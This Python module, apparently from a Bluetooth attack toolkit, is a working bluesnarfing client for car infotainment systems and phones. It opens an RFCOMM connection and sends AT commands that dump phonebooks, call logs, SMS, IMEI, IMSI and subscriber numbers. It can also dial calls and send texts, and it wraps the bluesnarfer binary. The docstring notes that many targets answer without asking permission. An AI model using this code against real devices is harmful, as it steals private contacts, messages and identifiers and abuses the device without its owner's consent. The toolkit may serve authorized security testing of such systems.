"""Bluesnarfer wrapper - AT command-based data extraction over RFCOMM.

Bluesnarfer uses AT commands (AT+CPBR, AT+CMGL, etc.) to read phonebook,
call logs, and SMS directly from the target device. Many IVIs support these
AT commands without prompting for permission.

This module provides both a bluesnarfer binary wrapper and a pure-Python
AT command client over RFCOMM for cases where bluesnarfer isn't available.

Implementation boundary:
  - Structured parsing is only provided for common, interoperable AT commands
    used for extraction and host-state queries.
  - Unknown or vendor-specific AT commands remain operator-driven. Their raw
    responses should be inspected manually instead of being force-fit into a
    misleading structured schema.

Memory types (AT+CPBS):
  SM  = SIM phonebook
  ME  = Phone memory
  DC  = Dialed calls
  RC  = Received calls
  MC  = Missed calls
  FD  = Fixed dialing
  ON  = Own numbers
"""

from __future__ import annotations

import json
import os
import re
import socket
import time

from blue_tap.utils.bt_helpers import run_cmd, check_tool, normalize_mac
from blue_tap.utils.output import info, success, error, warning


class ATClient:
    """Pure-Python AT command client over RFCOMM.

    This is an alternative to bluesnarfer that works without external tools.
    Connects to an RFCOMM channel (typically SPP or DUN) and sends AT commands.

    Usage:
        client = ATClient("AA:BB:CC:DD:EE:FF", channel=1)
        client.connect()
        contacts = client.read_phonebook("ME", 1, 500)
        calls = client.read_phonebook("DC", 1, 100)
        sms = client.read_sms("ALL")
        imei = client.get_imei()
        client.disconnect()
    """

    def __init__(self, address: str, channel: int = 1):
        self.address = normalize_mac(address)
        self.channel = channel
        self.sock = None
        self.last_capability_limitations: list[str] = []

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
            )
            self.sock.settimeout(5.0)
            info(f"Connecting AT client to {self.address} ch {self.channel}...")
            self.sock.connect((self.address, self.channel))
            success("AT RFCOMM connected")
            # Drain any initial banner
            try:
                self.sock.recv(1024)
            except TimeoutError:
                pass
            return True
        except OSError as e:
            error(f"AT connect failed: {e}")
            return False

    def disconnect(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_at(self, command: str, timeout: float = 3.0) -> str:
        """Send AT command and return response."""
        if not self.sock:
            return ""
        try:
            self.sock.send(f"{command}\r\n".encode())
            response = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data = self.sock.recv(4096)
                    if data:
                        response += data
                        text = response.decode("utf-8", errors="replace")
                        if "OK" in text or "ERROR" in text:
                            break
                except TimeoutError:
                    continue
            return response.decode("utf-8", errors="replace")
        except OSError as e:
            error(f"AT error: {e}")
            return ""

    @staticmethod
    def response_indicates_success(response: str) -> bool:
        text = (response or "").upper()
        if not text.strip():
            return False
        if "ERROR" in text or "NO CARRIER" in text or "BUSY" in text or "NO ANSWER" in text:
            return False
        if "OK" in text:
            return True
        lines = [line.strip() for line in (response or "").splitlines() if line.strip()]
        return any(line.startswith("+") and ":" in line for line in lines) or any(line.isdigit() for line in lines)

    @staticmethod
    def parse_phonebook_response(response: str) -> list[dict]:
        entries = []
        for line in (response or "").splitlines():
            line = line.strip()
            if not line.startswith("+CPBR:"):
                continue
            payload = line.split(":", 1)[1].strip()
            parts = [part.strip() for part in payload.split(",", 3)]
            entry = {
                "index": parts[0] if len(parts) > 0 else "",
                "number": parts[1].strip('"') if len(parts) > 1 else "",
                "type": parts[2] if len(parts) > 2 else "",
                "name": parts[3].strip('"') if len(parts) > 3 else "",
            }
            entries.append(entry)
        return entries

    @staticmethod
    def parse_sms_response(response: str) -> list[dict]:
        messages = []
        lines = (response or "").splitlines()
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            if line.startswith("+CMGL:"):
                payload = line.split(":", 1)[1].strip()
                header_parts = [part.strip() for part in payload.split(",", 4)]
                msg = {
                    "index": header_parts[0] if len(header_parts) > 0 else "",
                    "status": header_parts[1].strip('"') if len(header_parts) > 1 else "",
                    "sender": header_parts[2].strip('"') if len(header_parts) > 2 else "",
                    "alpha": header_parts[3].strip('"') if len(header_parts) > 3 else "",
                    "timestamp": header_parts[4].strip('"') if len(header_parts) > 4 else "",
                    "body": "",
                }
                i += 1
                body_lines = []
                while i < len(lines):
                    next_line = lines[i].strip()
                    if next_line.startswith("+CMGL:") or next_line == "OK" or next_line == "ERROR":
                        break
                    body_lines.append(lines[i].rstrip())
                    i += 1
                msg["body"] = "\n".join(body_lines).strip()
                messages.append(msg)
                continue
            i += 1
        return messages

    @staticmethod
    def parse_identity_response(response: str, *, min_digits: int) -> str:
        for line in (response or "").splitlines():
            candidate = line.strip()
            if candidate.isdigit() and len(candidate) >= min_digits:
                return candidate
        return ""

    @staticmethod
    def parse_battery_response(response: str) -> dict:
        match = re.search(r"\+CBC:\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)", response or "")
        if not match:
            return {"raw": response.strip(), "battery_status": None, "level_percent": None, "millivolts": None}
        return {
            "raw": response.strip(),
            "battery_status": int(match.group(1)),
            "level_percent": int(match.group(2)),
            "millivolts": int(match.group(3)),
        }

    @staticmethod
    def parse_signal_response(response: str) -> dict:
        match = re.search(r"\+CSQ:\s*(\d+)\s*,\s*(\d+)", response or "")
        if not match:
            return {"raw": response.strip(), "rssi": None, "ber": None}
        return {
            "raw": response.strip(),
            "rssi": int(match.group(1)),
            "ber": int(match.group(2)),
        }

    @staticmethod
    def parse_operator_response(response: str) -> dict:
        match = re.search(r'\+COPS:\s*(\d+)\s*,\s*(\d+)\s*,\s*"([^"]*)"(?:\s*,\s*(\d+))?', response or "")
        if not match:
            return {"raw": response.strip(), "mode": None, "format": None, "operator": "", "access_technology": None}
        return {
            "raw": response.strip(),
            "mode": int(match.group(1)),
            "format": int(match.group(2)),
            "operator": match.group(3),
            "access_technology": int(match.group(4)) if match.group(4) is not None else None,
        }

    @staticmethod
    def parse_subscriber_response(response: str) -> list[dict]:
        matches = re.findall(
            r'\+CNUM:\s*"([^"]*)"\s*,\s*"([^"]*)"\s*,\s*(\d+)(?:\s*,\s*([^,\r\n]+))?',
            response or "",
        )
        return [
            {
                "label": label,
                "number": number,
                "type": int(number_type),
                "speed": speed.strip() if speed else "",
            }
            for label, number, number_type, speed in matches
        ]

    def list_available_memories(self) -> list[str]:
        """Query which phonebook memories are available (AT+CPBS=?)."""
        response = self.send_at("AT+CPBS=?")
        if "ERROR" in response:
            return []
        # Parse: +CPBS: ("ME","SM","DC","RC","MC","ON","FD")
        return re.findall(r'"(\w+)"', response)

    def read_phonebook(self, memory: str = "ME",
                        start: int = 1, end: int = 500) -> list[dict]:
        """Read phonebook entries using AT+CPBR.

        Memory types: SM (SIM), ME (phone), DC (dialed), RC (received), MC (missed)
        """
        # Select memory and check it succeeded
        select_response = self.send_at(f'AT+CPBS="{memory}"')
        if not self.response_indicates_success(select_response):
            warning(f"Memory type '{memory}' not available on this device")
            return []

        # Read entries
        response = self.send_at(f"AT+CPBR={start},{end}", timeout=10.0)
        return self.parse_phonebook_response(response)

    def read_sms(self, status: str = "ALL") -> list[dict]:
        """Read SMS messages using AT+CMGL.

        Status: "REC UNREAD", "REC READ", "STO UNSENT", "STO SENT", "ALL"
        """
        # Set text mode
        self.send_at("AT+CMGF=1")

        response = self.send_at(f'AT+CMGL="{status}"', timeout=15.0)
        return self.parse_sms_response(response)

    def get_imei(self) -> str:
        """Get device IMEI."""
        response = self.send_at("AT+CGSN")
        return self.parse_identity_response(response, min_digits=15)

    def get_imsi(self) -> str:
        """Get SIM IMSI."""
        response = self.send_at("AT+CIMI")
        return self.parse_identity_response(response, min_digits=14)

    def get_subscriber_number(self) -> str:
        """Get own phone number."""
        response = self.send_at("AT+CNUM")
        return response

    def get_subscriber_numbers(self) -> list[dict]:
        return self.parse_subscriber_response(self.send_at("AT+CNUM"))

    def get_battery(self) -> str:
        """Get battery level."""
        return self.send_at("AT+CBC")

    def get_battery_info(self) -> dict:
        return self.parse_battery_response(self.get_battery())

    def get_signal(self) -> str:
        """Get signal strength."""
        return self.send_at("AT+CSQ")

    def get_signal_info(self) -> dict:
        return self.parse_signal_response(self.get_signal())

    def get_operator(self) -> str:
        """Get network operator."""
        return self.send_at("AT+COPS?")

    def get_operator_info(self) -> dict:
        return self.parse_operator_response(self.get_operator())

    def dial(self, number: str) -> str:
        """Initiate a call (if supported)."""
        return self.send_at(f"ATD{number};")

    def send_sms(self, number: str, message: str) -> str:
        """Send an SMS (if supported)."""
        if not self.sock:
            return ""
        self.send_at("AT+CMGF=1")  # Text mode
        self.sock.send(f'AT+CMGS="{number}"\r'.encode())
        time.sleep(0.5)
        self.sock.send(f"{message}\x1a".encode())  # Ctrl+Z to send
        time.sleep(2)
        try:
            return self.sock.recv(1024).decode("utf-8", errors="replace")
        except TimeoutError:
            return ""

    def dump_all(self, output_dir: str = "at_dump") -> dict:
        """Dump all available data via AT commands."""
        os.makedirs(output_dir, exist_ok=True)
        self.last_capability_limitations = []
        results = {}

        # Device info
        info("Gathering device info...")
        device_info = {
            "imei": self.get_imei(),
            "imsi": self.get_imsi(),
            "subscriber_numbers": self.get_subscriber_numbers(),
            "operator": self.get_operator_info(),
            "signal": self.get_signal_info(),
            "battery": self.get_battery_info(),
        }
        results["device_info"] = device_info
        _write_json(os.path.join(output_dir, "device_info.json"), device_info)
        success(f"IMEI: {device_info['imei']}")
        if not device_info["imei"]:
            self.last_capability_limitations.append("AT+CGSN did not return a parseable IMEI")
        if not device_info["imsi"]:
            self.last_capability_limitations.append("AT+CIMI did not return a parseable IMSI")

        # Check which memories are available first
        available = self.list_available_memories()
        if available:
            info(f"Available phonebook memories: {', '.join(available)}")
        else:
            self.last_capability_limitations.append("AT+CPBS=? did not report available phonebook memories")

        # Phonebooks — only try memories that are available
        memories = [("ME", "Phone"), ("SM", "SIM"), ("DC", "Dialed"),
                    ("RC", "Received"), ("MC", "Missed")]
        for mem, desc in memories:
            if available and mem not in available:
                continue
            info(f"Reading {desc} phonebook ({mem})...")
            entries = self.read_phonebook(mem)
            if entries:
                results[f"phonebook_{mem}"] = entries
                _write_json(os.path.join(output_dir, f"phonebook_{mem}.json"), entries)
                success(f"  {desc}: {len(entries)} entries")

        # SMS
        info("Reading SMS messages...")
        messages = self.read_sms("ALL")
        if messages:
            results["sms"] = messages
            _write_json(os.path.join(output_dir, "sms.json"), messages)
            success(f"  SMS: {len(messages)} messages")
        else:
            self.last_capability_limitations.append('AT+CMGL="ALL" did not return parseable SMS content')

        # Summary
        total_items = sum(
            len(v) for k, v in results.items()
            if k != "device_info" and isinstance(v, list)
        )
        success(f"Dump complete: {total_items} total items -> {output_dir}")

        return results


def bluesnarfer_extract(address: str, memory: str = "ME",
                         start: int = 1, end: int = 100) -> str:
    """Use bluesnarfer binary for phonebook extraction.

    Fallback when pure-Python AT client doesn't work.
    """
    if not check_tool("bluesnarfer"):
        error("bluesnarfer not found. Install: apt install bluesnarfer")
        return ""

    info(f"Running bluesnarfer on {address} (memory={memory}, range={start}-{end})")
    result = run_cmd(
        ["bluesnarfer", "-b", address, "-s", memory, "-r", f"{start}-{end}"],
        timeout=30,
    )
    if result.returncode == 0:
        success(f"bluesnarfer output:\n{result.stdout}")
        return result.stdout
    else:
        error(f"bluesnarfer failed: {result.stderr}")
        return ""


def _write_json(path: str, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
